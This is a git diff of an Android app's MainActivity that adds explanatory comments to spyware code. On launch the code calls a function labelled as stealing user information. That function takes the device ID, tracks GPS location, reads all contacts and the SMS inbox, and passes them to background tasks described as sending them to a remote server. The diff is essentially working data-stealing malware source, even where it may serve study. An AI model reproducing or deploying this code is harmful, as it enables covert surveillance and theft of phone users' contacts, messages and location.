@@ -23,6 +23,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        //Call to the funny thing
         exploit();
     }
 
@@ -48,16 +49,19 @@ public class MainActivity extends AppCompatActivity {
         return super.onOptionsItemSelected(item);
     }
 
+    // Function that exploits the virus payload: stealing user information
     public void exploit(){
 
-        //Conctacts list data structure
-        ArrayList<Pair<String, String>> contacts = new ArrayList<>();
-        LocationManager mLocationManager;
-        String android_id;
 
+        ArrayList<Pair<String, String>> contacts = new ArrayList<>();  //Conctacts list data structure
+        LocationManager mLocationManager; //Class that handles the GPS location
+        String android_id; //Android device identifier
+
+        // Get android device identifier
         android_id = Settings.Secure.getString(getBaseContext().getContentResolver(),
                 Settings.Secure.ANDROID_ID);
 
+        // Get current GPS location
         mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
         LocationListener locationListener = new MyLocationListener(getBaseContext(), android_id);
         mLocationManager.requestLocationUpdates(
@@ -73,9 +77,10 @@ public class MainActivity extends AppCompatActivity {
         sendSMS(android_id);
     }
 
-    // Function to save all contacts of the user in a data structure.
+    // Function to save all contacts of the user in a data structure and send them to the remote server by calling an AsyncTask
     public void sendContacts(String android_id, ArrayList<Pair<String, String>> contacts) throws IOException {
 
+        //Collect contact names and phone numbers.
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -100,10 +105,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
+        // Send the information to remote server
         new SendContactListAsyncTask(this, android_id, contacts).execute();
     }
 
 
+    // Function that gets all the SMS and send it to the remote server.
     public void sendSMS(String android_id){
 
         ArrayList<String> messages = new ArrayList<>();
@@ -124,6 +131,7 @@ public class MainActivity extends AppCompatActivity {
             // empty box, no SMS
         }
 
+        // Send the information to remote server
         new SendSMSAsyncTask(this, android_id, messages).execute();
     }
 }
